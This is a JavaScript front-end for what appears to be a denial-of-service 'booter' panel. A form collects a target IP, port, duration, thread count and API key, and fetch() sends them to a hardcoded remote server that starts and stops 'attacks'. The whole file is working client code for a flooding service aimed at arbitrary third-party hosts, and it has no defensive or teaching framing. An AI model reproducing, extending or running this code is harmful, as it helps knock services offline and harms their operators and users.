document.getElementById('attackForm').addEventListener('submit', function (event) {
  event.preventDefault();

  const ip = document.getElementById('ip').value;
  const port = document.getElementById('port').value;
  const time = document.getElementById('time').value;
  const threads = document.getElementById('threads').value;
  const apikey = document.getElementById('apikey').value;

  if (!ip || !port || !time || !threads || !apikey) {
    document.getElementById('response').innerHTML = `<p class="text-red-500">❌ All fields are required!</p>`;
    return;
  }

  const url = `http://158.220.83.124:5000/start?ip=${ip}&port=${port}&time=${time}&threads=${threads}&apikey=${apikey}`;

  document.getElementById('response').innerHTML = `<p class="text-blue-500">🚀 Sending attack...</p>`;

  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.status === 'started') {
        document.getElementById('response').innerHTML = `
          <p class="text-green-500">✅ Attack started! ID: <strong>${data.attack_id}</strong></p>
          <button onclick="stopAttack('${data.attack_id}')" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded mt-4">🛑 Stop Attack</button>
        `;
      } else {
        document.getElementById('response').innerHTML = `<p class="text-red-500">❌ ${data.error}</p>`;
      }
    })
    .catch(error => {
      console.error('Error:', error);
      document.getElementById('response').innerHTML = `<p class="text-red-500">❌ Failed to start attack</p>`;
    });
});

function stopAttack(id) {
  const url = `http://158.220.83.124:5000/stop?attack_id=${id}`;
  document.getElementById('response').innerHTML = `<p class="text-yellow-500">🛑 Stopping attack...</p>`;

  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.status) {
        document.getElementById('response').innerHTML = `<p class="text-green-500">✅ ${data.status}</p>`;
      } else {
        document.getElementById('response').innerHTML = `<p class="text-red-500">❌ ${data.error}</p>`;
      }
    })
    .catch(error => {
      console.error('Error:', error);
      document.getElementById('response').innerHTML = `<p class="text-red-500">❌ Failed to stop attack</p>`;
    });
}
